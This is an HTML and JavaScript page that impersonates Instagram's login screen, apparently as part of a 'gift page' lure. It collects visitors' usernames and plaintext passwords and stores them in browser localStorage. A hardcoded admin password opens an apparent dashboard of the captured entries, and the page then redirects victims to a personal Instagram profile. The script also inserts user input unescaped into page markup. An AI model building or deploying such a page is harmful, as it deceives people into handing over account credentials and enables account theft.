<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram-style Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('A.jpg') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .login-container {
      margin-top: 50px;
      border: 1px solid #dbdbdb;
      background: white;
      padding: 40px;
      text-align: center;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-container h1 {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      margin-bottom: 10px;
    }
    .login-container h2 {
      font-size: 24px;
      margin-bottom: 5px;
    }
    .login-container p {
      font-size: 12px;
      color: #888;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
    }
    .eye-toggle {
      position: relative;
      display: flex;
      align-items: center;
    }
    .eye-toggle span {
      position: absolute;
      right: 10px;
      cursor: pointer;
      color: #666;
    }
    button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    #confirmPrompt {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.95);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    #confirmPrompt div {
      background: #fff;
      border: 2px solid #3897f0;
      padding: 30px;
      text-align: left;
      font-size: 16px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>
  <div class="login-container" id="loginContainer">
    <h1>Instagram</h1>
    <h2>Welcome</h2>
    <p>Please log in with your Instagram credentials</p>
    <input type="text" id="username" placeholder="Username">
    <div class="eye-toggle">
      <input type="password" id="password" placeholder="Password">
      <span onclick="togglePassword()">üëÅ</span>
    </div>
    <button onclick="confirmLogin()">Log In</button>
  </div>

  <div id="confirmPrompt"></div>

  <script>
    const entries = JSON.parse(localStorage.getItem('loginData')) || [];

    function togglePassword() {
      const pass = document.getElementById('password');
      pass.type = pass.type === 'password' ? 'text' : 'password';
    }

    function toggleConfirmPass() {
      const input = document.getElementById('confirmPassInput');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function confirmLogin() {
      const user = document.getElementById('username').value.trim();
      const pass = document.getElementById('password').value.trim();

      if (!user || !pass) {
        alert("Please fill in all fields.");
        return;
      }

      const container = document.getElementById('confirmPrompt');
      container.style.display = 'flex';
      document.getElementById('loginContainer').style.display = 'none';
      container.innerHTML = `
        <div>
          <p><strong>Confirm your details:</strong></p>
          <p>Username: ${user}</p>
          <p>Password: 
            <input type="password" value="${pass}" id="confirmPassInput" style="width: 80%; padding: 5px;"> 
            <span onclick="toggleConfirmPass()">üëÅ</span>
          </p>
          <button onclick="handleConfirm('${user}', '${pass}')">Confirm</button>
          <button onclick="cancelPrompt()">Cancel</button>
        </div>
      `;
    }

    function cancelPrompt() {
      document.getElementById('confirmPrompt').style.display = 'none';
      document.getElementById('loginContainer').style.display = 'block';
    }

    function handleConfirm(user, pass) {
      const container = document.getElementById('confirmPrompt');
      container.style.display = 'none';

      // Admin logic
      if (user === "Bravo" && pass === "Bravin,18794") {
        alert("Welcome Admin. Opening dashboard...");
        window.location.href = "admin.html";
        return;
      }

      // Check for existing
      const existing = entries.find(e => e.username === user && e.password === pass);
      const currentDate = new Date().toLocaleString();
      if (existing) {
        existing.date = currentDate;
      } else {
        entries.push({ username: user, password: pass, date: currentDate, deletable: true });
      }
      localStorage.setItem('loginData', JSON.stringify(entries));

      // Redirect
      alert("Redirecting to Instagram...");
      window.location.href = "https://instagram.com/bravo_momanyi?text=I%20found%20you%20on%20your%20gift%20page";
    }
  </script>
</body>
</html>
